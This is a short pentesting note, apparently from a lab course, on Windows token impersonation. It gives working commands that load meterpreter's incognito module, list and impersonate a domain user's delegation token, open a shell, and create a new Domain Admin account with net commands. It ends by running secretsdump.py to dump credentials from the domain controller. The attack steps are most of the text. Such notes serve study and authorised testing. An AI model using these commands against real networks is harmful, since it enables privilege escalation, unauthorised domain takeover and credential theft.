Tokens are temporary keys that allow you to access a system/network without providing a password every time. e.g. cookies but for computers.

Two types:
* Delegate - Created for logging into a machine or using Remote Desktop.
* Impersonate - "non-interactive" such as attaching a network drive or a domain logon script.
Delegation tokens can be used to impersonate other users.
# How to do it - Delegation tokens
Get a meterpreter shell. Then do the following:
```powershell
load incognito
list_tokens -u # Lists delegation tokens

impersonate_token [TOKEN]
# e.g the token is MARVEL\fcastle, the command would be: 
impersonate_token MARVEL\\fcastle # Extra \ as an escape character

shell
```
Next,  a new Domain Admin user can be created.
```batch
net user /add [USERNAME] [PASSWORD] /domain
net group "Domain Admins" [USERNAME] /add /domain
```
Finally, secretsdump.py can be run against the new user to compromise the Domain Controller.
```bash
secretsdump.py [DOMAIN]/[USERNAME]:'[PASSWORD]'@[DC IP]
```
